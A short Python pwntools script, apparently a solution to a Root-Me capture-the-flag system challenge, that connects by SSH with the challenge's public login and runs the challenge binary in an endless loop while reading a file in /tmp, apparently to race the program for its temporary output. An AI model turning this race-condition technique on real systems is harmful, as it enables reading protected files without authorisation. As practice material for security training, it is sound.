from pwn import *

host = "challenge02.root-me.org"

port = 2222

username = "app-systeme-ch12"
password = "app-systeme-ch12"

ssh_con = ssh(user=username,host=host,port=port,password=password)

command = './ch12 | cat /tmp/tmp_file.txt'

while True:
    process = ssh_con.process(command,shell=True)
    
    output = process.recvall().decode('utf-8')
    print(output)
    sleep(1)
    

ssh_con.close()
